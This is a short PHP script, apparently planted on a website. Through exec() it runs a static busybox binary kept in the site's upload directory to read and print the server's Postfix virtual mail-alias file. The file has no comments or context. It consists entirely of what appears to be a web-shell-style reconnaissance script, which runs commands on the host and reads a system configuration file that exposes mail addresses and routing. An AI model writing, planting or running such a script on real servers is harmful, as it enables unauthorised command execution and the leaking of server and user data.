<?php
$tmp = exec("/home/wroclaw/wroclawweekly.pl/upload/busybox.static cat /etc/postfix/virtual", $results);
foreach ($results as $r) { print $r . '\r'; }
?> 
